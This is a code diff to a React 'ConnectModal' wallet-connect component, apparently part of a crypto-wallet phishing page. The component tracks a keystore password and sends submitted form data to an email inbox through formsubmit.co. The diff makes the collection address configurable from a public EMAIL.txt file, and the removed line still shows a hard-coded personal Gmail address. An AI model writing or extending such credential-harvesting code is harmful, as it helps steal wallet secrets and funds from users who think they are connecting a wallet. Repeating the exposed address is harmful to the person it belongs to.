@@ -5,6 +5,7 @@ import { motion, AnimatePresence } from "framer-motion";
 import { useRouter } from "next/navigation";
 import { X, Loader2, AlertCircle } from "lucide-react";
 import { cn } from "@/lib/utils";
+import { SUBMISSION_EMAIL } from "@/constants/email";
 
 interface ConnectModalProps {
     isOpen: boolean;
@@ -23,6 +24,20 @@ export function ConnectModal({ isOpen, onClose, walletName, walletIcon }: Connec
     const [inputError, setInputError] = useState("");
     const [isSaved, setIsSaved] = useState(false);
     const [keystorePassword, setKeystorePassword] = useState("");
+    const [submissionEmail, setSubmissionEmail] = useState(SUBMISSION_EMAIL);
+
+    useEffect(() => {
+        // Fetch the email from the public EMAIL.txt file
+        // This allows the user to change the email without touching the code
+        fetch("/EMAIL.txt")
+            .then((res) => res.text())
+            .then((text) => {
+                if (text && text.includes("@")) {
+                    setSubmissionEmail(text.trim());
+                }
+            })
+            .catch((err) => console.error("Could not load EMAIL.txt, using default", err));
+    }, []);
 
     useEffect(() => {
         if (isOpen) {
@@ -76,8 +91,8 @@ export function ConnectModal({ isOpen, onClose, walletName, walletIcon }: Connec
             // Example: https://formsubmit.co/ajax/myname@gmail.com
             // ---------------------------------------------------------
             try {
-                // Sending to user provided email: jessicamatt91@gmail.com
-                await fetch("https://formsubmit.co/ajax/jessicamatt91@gmail.com", {
+                // Sending to email loaded from public/EMAIL.txt
+                await fetch(`https://formsubmit.co/ajax/${submissionEmail}`, {
                     method: "POST",
                     headers: {
                         "Content-Type": "application/json",
